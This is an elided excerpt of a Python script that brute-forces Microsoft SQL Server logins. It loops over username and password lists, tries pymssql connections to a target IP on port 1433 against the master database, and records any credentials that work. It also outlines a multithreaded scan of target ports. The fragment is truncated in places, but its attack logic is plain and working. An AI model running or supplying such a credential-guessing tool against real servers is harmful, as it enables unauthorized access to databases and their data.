...
def brute(ip,port,users,passwds):
	for u in users:
		for p in passwds:
			...
			# print(p)
			try:
				conn = pymssql.connect(host=ip,user=u,passwd=p,port=int(port),database='master', timeout=5,charset="utf-8")
				if conn:
					res = "[+] success: {0}:{1} ---- {2}:{3}".format(ip,port,u,p)
					# print(res)
					result.append(res)
					return res
...
if __name__ == '__main__':
	...
	parser.add_option("-p", dest="port", default="1433", help="target port")
	...
	if options.host:
		...
		多线程获取端口开放
		"""
		file_name = "{0}_mssql.txt".format(port)
		for i in range(10):
